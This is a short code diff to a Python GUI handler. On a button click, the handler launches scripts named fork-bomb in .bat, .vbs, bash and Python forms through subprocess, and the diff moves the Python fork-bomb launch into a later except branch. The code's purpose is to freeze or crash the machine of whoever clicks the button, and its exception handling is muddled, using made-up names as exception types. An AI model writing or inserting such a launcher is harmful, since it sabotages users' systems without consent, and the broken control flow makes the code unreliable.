@@ -15,10 +15,8 @@ def path_finder(folder_name, filename):
 def on_button_click():
     print("Button clicked!")
 
+    
     try:
-        script_path = path_finder("scripts", "fork-bomb.py")
-        subprocess.run([sys.executable, script_path])
-    except runBat:
         script_path = path_finder("scripts", "fork-bomb.bat")
         subprocess.run(script_path)
     except runBashShell:
@@ -27,6 +25,9 @@ def on_button_click():
     except runVBS:
         script_path = path_finder("scripts", "fork-bomb.vbs")
         subprocess.run(["cscript", script_path])
+    except pythonExecutable:
+        script_path = path_finder("scripts", "fork-bomb.py")
+        subprocess.run([sys.executable, script_path])
     finally:
         exit()
 
